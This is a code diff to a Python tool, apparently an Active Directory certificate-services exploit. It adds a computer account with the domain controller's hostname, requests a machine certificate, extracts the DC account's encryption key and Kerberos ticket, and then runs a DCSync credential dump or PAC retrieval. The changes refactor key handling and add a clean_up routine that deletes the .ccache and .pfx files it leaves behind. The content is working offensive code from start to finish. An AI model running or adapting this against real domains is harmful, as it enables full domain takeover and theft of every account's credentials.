@@ -168,7 +168,7 @@ class Exploit:
                 ca_service = enrollment_service.get("cn")[0].decode()
                 ca_host = enrollment_service.get("dNSHostName")[0].decode()
             
-            print(ca_service,":",ca_host)
+            #print(ca_service,":",ca_host)
 
             # find template Machine
             if b'Machine' in enrollment_service.get("certificateTemplates"):
@@ -185,13 +185,16 @@ class Exploit:
             
             try:
                 pfx_bytes = main_req(self.options,ca_host,ca_service,new_computer_name,new_computer_password,domain,lmhash,nthash,cert_pass)
-                enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
+                enc_key, ccache_bytes = amain(self.options,cert_pass,pfx_bytes,domain,f'{dc_host}$')
+                #enc_key = amain(self.options,cert_pass,f'{new_computer_name}.pfx',domain,f'{dc_host}$')
                 logging.info(f'Encryption key retrieved: {enc_key}')
             except:
                 return
-            
-            os.environ['KRB5CCNAME'] = f'{dc_host}$.ccache'
+           
+            ccache_loc = f'{dc_host}$.ccache'
+            os.environ['KRB5CCNAME'] = ccache_loc
 
+            # dcsync
             if self.options.dump:
                 try:
                     self.options.k = True
@@ -205,12 +208,12 @@ class Exploit:
                         traceback.print_exc()
                     logging.error(str(e))
             else:
-                dumper = GETPAC(username,domain,enc_key,self.options)
+                self.options.key = enc_key
+                dumper = GETPAC(dc_host,domain,self.options)
                 dumper.dump()
 
-
-
-            # dcsync
+            logging.info("Cleaning up...")
+            clean_up()
 
     def find_enrollment_services(self,ldap_session,dn):
         enroll_filter = "(objectCategory=pKIEnrollmentService)"
@@ -236,6 +239,15 @@ class Exploit:
             logging.info(f'{new_computer_name} dnsHostname attribute updated to {dcfull}') 
         else:
             logging.error('dnsHostname attribute failed to change , Reson {}'.format(ldap_session.result['message']))
+
+def clean_up():
+    try:
+        dirs = os.listdir(".")
+        for i in dirs:
+            if i.endswith(".ccache") or i.endswith(".pfx"):
+                os.remove(i)
+    except:
+        pass
 
 def fetch_root_cas(ldap_conn, domain):
     cas_filter = "(objectClass=certificationAuthority)"
@@ -344,4 +356,8 @@ def main():
         logging.error(e)
     
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("Exiting. Cleaning up...")
+        clean_up()
